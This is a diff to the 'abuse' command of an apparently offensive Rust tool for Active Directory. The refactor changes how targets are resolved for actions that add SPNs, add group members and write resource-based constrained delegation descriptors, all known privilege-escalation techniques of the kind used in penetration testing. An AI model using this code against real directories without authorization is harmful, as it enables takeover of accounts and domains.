@@ -145,7 +145,8 @@ pub(crate) async fn abuse(mut a: AbuseArgs) -> Result<()> {
         gssapi: false,
     };
     let mut c = Collector::connect(&cfg).await?;
-    let target_dn = c.resolve_dn(&a.target).await?;
+    // ux-2: accept SID / sAMAccountName / DN — classify() dispatches to the right resolver.
+    let target_dn = crate::target::to_dn(&mut c, &a.target).await?;
 
     match a.action {
         AbuseAction::AddSpn => {
@@ -157,7 +158,7 @@ pub(crate) async fn abuse(mut a: AbuseArgs) -> Result<()> {
             );
         }
         AbuseAction::AddMember => {
-            let member_dn = c.resolve_dn(&a.value).await?;
+            let member_dn = crate::target::to_dn(&mut c, &a.value).await?;
             c.add_value(&target_dn, "member", &member_dn).await?;
             println!("[+] added {} to group {}", a.value, a.target);
         }
@@ -193,11 +194,7 @@ pub(crate) async fn abuse(mut a: AbuseArgs) -> Result<()> {
         }
         AbuseAction::WriteRbcd => {
             // value = SID (S-1-...) or sAMAccountName of the principal to grant delegation.
-            let trustee = if a.value.starts_with("S-") {
-                adhammer_core::sid::Sid::parse(&a.value).context("bad SID")?
-            } else {
-                c.resolve_sid(&a.value).await?
-            };
+            let trustee = crate::target::to_sid(&mut c, &a.value).await?;
             let sd = windows_sddl::build_rbcd_sd(&trustee);
             c.write_binary(&target_dn, "msDS-AllowedToActOnBehalfOfOtherIdentity", sd)
                 .await?;
